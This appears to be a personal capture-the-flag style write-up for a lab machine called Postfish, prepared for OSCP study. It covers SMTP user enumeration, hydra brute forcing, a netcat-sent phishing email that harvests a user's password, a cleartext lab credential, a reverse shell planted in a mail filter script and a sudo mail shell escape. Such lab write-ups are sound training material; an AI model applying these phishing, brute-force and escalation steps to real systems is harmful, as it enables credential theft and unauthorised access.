@@ -1,0 +1,242 @@
+**Start 08:15 08-05-2025**
+
+---
+```
+Scope:
+192.168.145.137
+```
+# Recon
+
+## Nmap
+
+```bash
+sudo nmap -sC -sV postfish -sT -T5 --min-rate=5000 -Pn -vvvv -p-                                                                   [0]
+
+PORT    STATE SERVICE  REASON  VERSION
+22/tcp  open  ssh      syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+25/tcp  open  smtp     syn-ack Postfix smtpd
+80/tcp  open  http     syn-ack Apache httpd 2.4.41 ((Ubuntu))
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+| http-methods: 
+|_  Supported Methods: HEAD GET POST OPTIONS
+|_http-title: Site doesnt have a title (text/html).
+110/tcp open  pop3     syn-ack Dovecot pop3d
+|_pop3-capabilities: RESP-CODES STLS PIPELINING AUTH-RESP-CODE USER SASL(PLAIN) CAPA TOP UIDL
+143/tcp open  imap     syn-ack Dovecot imapd (Ubuntu)
+|_imap-capabilities: LOGIN-REFERRALS more have post-login IMAP4rev1 LITERAL+ AUTH=PLAINA0001 capabilities ID OK STARTTLS ENABLE listed IDLE Pre-login SASL-IR
+|_ssl-date: TLS randomness does not represent time
+993/tcp open  ssl/imap syn-ack Dovecot imapd (Ubuntu)
+|_imap-capabilities: LOGIN-REFERRALS more post-login IMAP4rev1 LITERAL+ AUTH=PLAINA0001 capabilities ID OK have ENABLE listed IDLE Pre-login SASL-IR
+995/tcp open  ssl/pop3 syn-ack Dovecot pop3d
+|_pop3-capabilities: AUTH-RESP-CODE SASL(PLAIN) USER RESP-CODES PIPELINING CAPA TOP UIDL
+```
+
+This appears to be a mailing server.
+
+## 80/TCP - HTTP
+
+![](../../../assets/514526600861a1caa146acb7705f1d8d.png)
+
+We get a list of potential usernames.
+
+![](../../../assets/32d9833fb0f724cddf5f3e6374ba222b.png)
+
+We will use this list together with `username-anarchy` to try and create a wordlist of potential usernames.
+
+![](../../../assets/d9a891dfdf523e1819fe037e6d26f4c5.png)
+
+Let's check further
+
+![](../../../assets/35865803289ea53d27fcbaedf9fd5f7f.png)
+
+There's nothing else here.
+
+## 25/TCP - SMTP
+### User Enum
+
+I inserted my wordlist using `smtp-user-enum` and found all users to be existing:
+
+![](../../../assets/e78f922e7c166d5159678d462f526bee.png)
+
+I tried to brute force these usernames with `hydra` but it took way too long so I reran `smtp-user-enum` for other accounts.
+
+![](../../../assets/819840cc8211a3a2b5053b57e35a883b.png)
+
+We find some more so we'll add these to our wordlist, since most of these are default I'll add just the non-default ones for now:
+
+```
+hr
+sales
+```
+
+### Cewl - Wordlist Generation
+
+Now instead of guessing what password list to use, we will utilize another tool called `cewl` to generate a password list for us:
+
+```bash
+cewl -d 5 -m 3 http://postfish.off/team.html -w cewl.txt
+```
+
+## Hydra 
+
+![](../../../assets/6077fd4cf73a674dc734851684f7fe1b.png)
+
+This gave 0 matches, so I created a copy of the wordlist, but with all lowercase:
+
+```bash
+tr A-Z a-z < cewl.txt > cewl_lower.txt
+```
+
+I went ahead an reran it, slightly modifying my command:
+
+![](../../../assets/0fb9a81bdf2bf47f862ba9cd0b9109c1.png)
+
+>[!success]
+>After waiting for roughly 15 minutes we finally had a result:
+
+![](../../../assets/c4133e7b3de1349e42b27a1b9626b599.png)
+
+>[!note]
+>Next time try the username - username combo first......
+
+![](../../../assets/42afff8ce83543541e9f3c66f5472f86.png)
+
+Hell yeah.
+
+## 110/TCP - POP3s
+
+![](../../../assets/6a23f09541a94fc924c5f1a86a178032.png)
+
+![](../../../assets/eec0c4ec35f737e5f4421d1a9269a0b3.png)
+
+Let's check out the message.
+
+![](../../../assets/09a15c39f76c8947c512b8626256e19f.png)
+
+>[!note]
+>the `retr` command needs to be lowercase otherwise it will fail:
+>![](../../../assets/d190bda491cfcd3c890c06ec02f59ece.png)
+
+
+# Foothold
+## Phishing Attack via SMTP
+
+By reading the contents my gut instantly told me this was a *Phishing* attack.
+
+>[!note]
+>Since the message implies there will be a **link** sent instead of some file, we can't just send an Office document with a macro like in other cases, instead we'll have to send and embedded link with our own IP in it:
+
+```bash
+nc -vn 192.168.145.137 25
+
+helo postfish.off
+MAIL FROM: it@postfish.off
+RCPT TO: brian.moore@postfish.off
+DATA
+Subject: Password Reset
+
+reset password here <http://192.168.45.242/>
+.
+QUIT
+```
+
+Then wait for a while and see the following result:
+
+![](../../../assets/7ca3e700bf92b51a2b450ed51581bf5e.png)
+
+We now have the password for *brian.moore*.
+
+```
+brian.moore
+EternaLSunshinE
+```
+
+# Foothold
+## Shell as brian.moore
+
+![](../../../assets/dd4780b1b34773695f4143f491246253.png)
+
+After our successful phishing attack we gain access to *brian*'s `ssh` instance.
+
+### local.txt
+
+![](../../../assets/2dcf95237cc9e0afc8cd062b06ef6476.png)
+
+## Enumeration
+
+![](../../../assets/a224989e91287f48b7dd23ba528f3dd9.png)
+
+![](../../../assets/43b2873f8c6a0bc625b7b3c910d9bcd8.png)
+
+I notice some non-default groups I am part of.
+
+I tried to look them up but didn't find anything on it:
+
+![](../../../assets/db64f4725ab10830b94e810039c8c8db.png)
+
+![](../../../assets/88a471e2be84a99607bea5cf8f11730d.png)
+
+Nothing out of the ordinary here.
+
+Let's download over `linpeas.sh`.
+
+![](../../../assets/eb814ba3cda40ece9377d22e60e7f049.png)
+
+Interesting!
+
+![](../../../assets/fcbf33542d31180b7898d2721696bb23.png)
+
+Yet again
+
+Let's check it out:
+
+![](../../../assets/1b6250dfc5e4d72879b53832713d6a1a.png)
+
+# Privilege Escalation
+## Shell as filter
+
+Since we're in the `filter` group I was able to edit this script and add a reverse shell script inside:
+
+![](../../../assets/ac414902d8941737fce7b04b8509759f.png)
+
+![](../../../assets/d55b12ac3704757046e0dadb9a520adf.png)
+
+The change worked, now we have to send another sample mail for this to work.
+
+>[!fail]
+>This is the first time that `busybox` didn't work, I ended up changing the payload to a `bash` shell and it worked:
+>
+
+![](../../../assets/699fde7d2657a5bd4c9f601a4e3d8ce7.png)
+
+![](../../../assets/face376d88ca2d1909ece71b3ae947a8.png)
+
+## SUID binary
+
+![](../../../assets/d9df3fc8bc5ac934192ab58670fbef7d.png)
+
+We will be using the bottom one in order to escalate privs
+
+```bash
+sudo /usr/bin/mail --exec='!/bin/sh'
+```
+
+![](../../../assets/b4cd5db0043e944728b500c2820d9edf.png)
+
+### proof.txt
+
+![](../../../assets/61252acfba54e8521e86c37761117591.png)
+
+>[!summary]
+>Super fun box, learned a lot! 
+>- New phishing techniques
+>- Found new `cewl` tool which is super handy!
+>- Refined `hydra` techniques
+
+---
+
+**Finished 10:18 08-05-2025**
+
+[^Links]: [[OSCP Prep]]
+
+#SUID #phishing #pop3 #smtp #cewl #hydra 
